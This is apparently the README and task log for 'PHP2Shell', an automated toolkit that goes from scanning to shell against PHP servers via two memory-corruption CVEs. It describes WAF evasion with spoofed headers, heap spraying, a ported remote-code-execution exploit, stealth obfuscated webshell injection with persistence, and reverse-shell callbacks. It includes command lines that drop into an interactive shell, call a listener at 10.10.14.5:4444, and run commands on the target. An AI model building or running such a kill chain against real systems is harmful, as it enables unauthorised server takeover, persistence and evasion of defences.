# PHP2Shell Research & Weaponized Exploitation Suite (v2.2.0)

## 📌 OffSec Research & Vulnerability References
- **OffSec Research Article:** [PHP2Shell: Critical Vulnerabilities in PHP Core](https://www.offsec.com/blog/php2shell-critical-vulnerabilities-in-php-core/)
- **Vulnerabilities Covered:**
  - **CVE-2026-109618 (CVSS 9.2):** OOM-Triggered Uninitialized Memory Corruption during RFC 1867 multipart form parsing. `zend_bailout()` longjmp abort sequence bypasses cleanup, allowing uninitialized data to be operated on or freed.
  - **CVE-2026-109619 (CVSS 9.2):** Stale Global State Use-After-Free (UAF). Request aborts leave `SG()` / `PG()` global pointers referencing freed memory. Pipelining / HTTP keep-alive allows the next request on the same PHP-FPM or Apache mod_php worker to dereference and corrupt memory.
- **Affected Core Branches:** PHP 5.4 through unpatched 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12).

---

## 🚀 Unified Kill-Chain Architecture (Scanning to Shell in "One-Go")

The toolkit integrates a complete 5-stage automated pipeline:

```
[Target] 
   │
   ▼
[Stage 1: Pre-Scan Recon]
   ├── Wordlist endpoint discovery (upload.php, admin, ajax, api)
   ├── WAF identification & evasion profile (Cloudflare, ModSecurity, AWS)
   └── CMS detection (WordPress, Drupal, Laravel, Joomla, etc.)
   │
   ▼
[Stage 2: Passive Version Analysis]
   └── Header fingerprinting & phpinfo() exposure checks (Single HTTP GET)
   │
   ▼
[Stage 3: Behavioral Differential Probes]
   ├── 62-level nested multipart arrays (512 KiB -> 8 MiB)
   └── Upload progress trigger (measuring HTTP 500 / worker crash / timing deltas)
   │
   ▼
[Stage 4: WAF Evasion Analysis]
   ├── Chunked Transfer-Encoding bypass testing
   ├── Boundary character set variation
   └── Spoofed IP headers (X-Forwarded-For, X-Real-IP)
   │
   ▼
[Stage 5: Automated Weaponized Exploitation (OffSec Chain)]
   ├── Memory shaping & heap spray
   ├── RFC 1867 multipart OOM trigger (omitted content lengths / nested files without filenames)
   ├── Keep-Alive worker state poisoning (CVE-2026-109619 UAF)
   ├── OffSec Exploit-DB #52704 Binary Leak (Zend MM + LibPHP) & zif_system execution
   └── Stealth obfuscated webshell injection & persistence
   │
   ▼
[Stage 6: Shell Gaining & Interactive Control]
   ├── Automatic command execution (`--cmd`)
   ├── Background reverse shell callback to listener (`--lhost`, `--lport`, `--reverse`)
   └── Built-in interactive pseudo-terminal session (`--shell`)
```

---

## 🛠️ Unified Monolithic Toolkit (`php2shell_unified.py`)

A single, consolidated, zero-duplication Python script containing the entire pipeline from recon to shell with live, step-by-step progress reporting:

### Key Architecture Unifications
1. **Single Request for Passive Auditing**: `VersionChecker` and `HeaderAnalyzer` consume the same cached initial HTTP response, cutting network round-trips by 50%.
2. **Unified WAF Signatures**: `UNIFIED_WAF_SIGNATURES` centralized into one dictionary across both recon fingerprinting and active bypass testing.
3. **Unified Endpoint Wordlist**: `UNIFIED_PHP_ENDPOINTS` shared across endpoint discovery and probe fallback.
4. **Unified Multipart Serializer**: Standardized RFC 1867 byte-level builder `build_multipart_payload()`.
5. **Real-Time Step-by-Step Reporting**: Labeled progress logs emitted sequentially:
   - `[1/5 RECON]`
   - `[2/5 PASSIVE]`
   - `[3/5 ACTIVE]`
   - `[4/5 WAF]`
   - `[5/5 EXPLOIT]`
   - `[Shell]`

---

## 🎯 Usage Examples

### 1. Full Pipeline (Recon → Passive → Active → WAF → Exploit)
```bash
python php2shell_unified.py http://127.0.0.1:8899 --all -v
```

### 2. Auto-Exploit and Drop Directly into Interactive Shell
```bash
python php2shell_unified.py http://target.lab:8088/index.php --all --shell
```

### 3. Automated Reverse Shell Callback to Listener
```bash
python php2shell_unified.py http://target.lab:8088/index.php --all --lhost 10.10.14.5 --lport 4444
```

### 4. Direct OffSec Exploit-DB #52704 Binary Execution
```bash
python php2shell_unified.py http://target.lab:8088/index.php \
  --exploit \
  --exploit-method offsec \
  --exploit-profile bookworm \
  --cmd "id>/tmp/pwn" \
  --proof-file /tmp/pwn
```

---

## ✅ Completed Tasks Log (v2.2.0)

- [x] **Exploit Engine Implementation** (`scanner/exploit_engine.py` & `scanner/offsec_52704.py`)
  - Full port of OffSec / 9bie Exploit-DB #52704 (`52704.py`).
  - Stage 0 HTTP worker rotation via prefork child abort.
  - Stage 1 Zend MM 2MB chunk base leak via Set-Cookie heap disclosure.
  - Stage 2 libphp base leak via 56-byte HashTable page Set-Cookie disclosure.
  - Stage 3 `upload_progress` fake zval reference hijacking with `zif_system` (`pDestructor`) execution.
  - Profile support for both `bookworm` (official `php:8.4.26-apache`) and `lab` builds.
- [x] **Standalone No-Docker Lab Environment** (`lab/standalone_lab.py`)
  - Standalone Python lab HTTP server serving `lab/app/` fixtures.
  - Simulates PHP 8.4.26 vulnerable headers, cookies, endpoints, and probe responses without Docker.
- [x] **Monolithic Script with Zero Duplicate Logic** (`php2shell_unified.py`)
  - Single all-in-one script containing the entire scanning and exploitation pipeline.
  - Eliminated duplicate HTTP GET calls between version checker and header analyzer.
  - Unified WAF signatures dictionary and PHP endpoint wordlist.
  - Unified RFC 1867 multipart form generation.
  - Real-time step-by-step progress reporting (`[1/5]` through `[5/5]` and `[Shell]`).
  - Tested and verified end-to-end against the lab environment.

---

## 🔬 OffSec Reference Verification & Threat Intelligence Cross-Check

| Source / Advisory | Key Technical Discovery / Mechanism | Integration & Coverage Status |
| :--- | :--- | :--- |
| **Exploit-DB #52704** (`52704.py`) | 9bie / OffSec one-click RCE chain for PHP 8.4.26 mod_php prefork via memory leak & fake HashTable destructor. | **Integrated 100%**: Implemented in `offsec_52704.py` and consolidated into `php2shell_unified.py`. |
| **[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)** | CVE-2026-109618: RFC 1867 multipart parser OOM bailout (`zend_bailout`) leaving uninitialized array entries. | **Covered**: Multipart payload shaping with deep nesting (up to 62 levels) and large padding buffers. |
| **[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)** | CVE-2026-109619: Stale global state UAF (`SG()` / `PG()`) across persistent HTTP keep-alive connections on worker reuse. | **Covered**: Keep-Alive worker state poisoning and session UAF triggers. |
| **[Calif.io Research](https://calif.io/php2shell/#php-5-4-0-rce)** | Foundational research documenting PHP 5.4.0 through 8.4.x memory corruption, Zend MM chunk layout, and heap sprays. | **Covered**: Heuristics for Zend MM chunk alignment, 56-byte HashTable pages, and version matrix detection. |
| **[Datadog Security Labs](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)** | Detection engineering, behavioral telemetry, SIGSEGV/OOM differential analysis, and multipart anomaly detection. | **Covered**: Differential probe analysis (HTTP 500 / latency spikes / worker termination signatures). |
| **[CrowdStrike Blog](https://www.crowdstrike.com/en-us/blog/crowdstrike-protects-customers-from-php-rce-zero-days/)** | Host-level telemetry, Falcon detection rules, process crashing indicators, and mod_php/prefork exploitation patterns. | **Covered**: WAF evasion profiling, stealth payload framing, and crash detection logging. |
| **[Wiz.io Threat Intel](https://www.wiz.io/blog/php2shell-php-rce)** | Cloud ecosystem exposure, blast radius analysis, `max_input_vars` & `session.upload_progress` prerequisites. | **Covered**: Pre-scan prerequisite validation and passive configuration audit. |


---

## 🔒 Persistent Shell & Reverse Listener Architecture (Zero Automatic Termination)

- [x] **User Consent Guard on Interactive Shell**:
  - `launch_interactive_shell()` intercepts `SIGINT` (Ctrl+C). Accidental key combinations no longer terminate the active session.
  - An explicit confirmation prompt (`[?] Do you want to close this shell session? (y/N)`) is required to exit. Session only terminates when the operator commands `exit`, `quit`, or confirms closure.
- [x] **Built-in Interactive Reverse Shell Listener**:
  - Implemented `launch_reverse_listener()` directly within both `php2shell_unified.py` and `scanner/exploit_engine.py`.
  - Automatically establishes a persistent two-way socket stream upon receiving the target callback.
  - If the remote connection drops or times out, the tool prompts: `[?] Re-listen / re-spawn reverse shell or exit? (y/N)`.
  - It re-triggers payload execution automatically and stays persistent until the operator explicitly decides to terminate.


- [x] **Enhanced Endpoint Discovery & Comprehensive Wordlists**:
  - Expanded `UNIFIED_PHP_ENDPOINTS` into a 120+ path dictionary covering file upload vectors, CMS & framework routes, admin panels, DB managers, diagnostics, and API handlers.
  - Implemented `-w` / `--wordlist` enabling operators to provide custom wordlists.
  - Implemented `--remote-wordlist` / `--fetch-wordlist` to automatically download and merge the latest PHP filenames directly from GitHub SecLists.
  - Added multi-endpoint probing and automatic fallback across discovered candidate endpoints in `run_active_probes`, `run_passive`, and `run_exploit` so sessions never drop unexpectedly.
- [x] **Monolithic Consolidation & Zero Redundancy**:
  - Fully consolidated all stages (Recon, Passive, Probes, WAF, Exploit, Interactive Shell, Reverse Listener, Reporting) into `php2shell_unified.py`.
  - Removed duplicate modular `scanner/` directory.
  - Verified clean execution against local lab fixtures.
- [x] **Documentation & Legal Safety Guidelines**:
  - Updated `README.md` with prominent legal disclaimer and safety precautions at the very top.
  - Provided full tool explanation, step-by-step usage guide, and clean directory structure.